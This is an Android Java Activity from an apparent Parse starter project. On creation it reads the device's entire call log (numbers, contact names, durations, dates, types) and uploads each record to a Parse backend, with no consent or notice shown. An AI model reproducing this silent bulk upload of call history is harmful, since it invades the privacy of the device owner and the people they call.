package com.parse.starter;

import com.parse.ParseObject;

import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.app.Activity;
import android.content.Context;
import android.content.CursorLoader;
import android.database.Cursor;
import android.util.Log;
import android.view.Menu;
import android.view.View;
// used: http://stackoverflow.com/questions/16727487/how-to-refresh-call-log for help
public class Call extends Activity {

	Context cont = Call.this;
	String number, name, date, duration;
	Cursor c;
	int type;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_call);
		Log.d("CALL", "acc on create");
		getCallHistory();
	}

	private void getCallHistory() {
		
		Uri calls = Uri.parse("content://call_log/calls");
		c = getContentResolver().query(calls, null, null, null, null);

	    while (c.moveToNext()) {
			ParseObject callData = new ParseObject("Calls");
	        number = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)); 
	        name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME)); 
	        duration = c.getString(c.getColumnIndex(CallLog.Calls.DURATION));
	        date = c.getString(c.getColumnIndex(CallLog.Calls.DATE));
	        type = Integer.parseInt(c.getString(c.getColumnIndex(CallLog.Calls.TYPE))); 
	        callData.put("number", number);
			callData.put("name", name);
			callData.put("duration", duration);
			callData.put("date", date);
			callData.put("type", type);
			callData.saveInBackground();
	    }
	    c.close();
	}
	
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.call, menu);
		return true;
	}

}
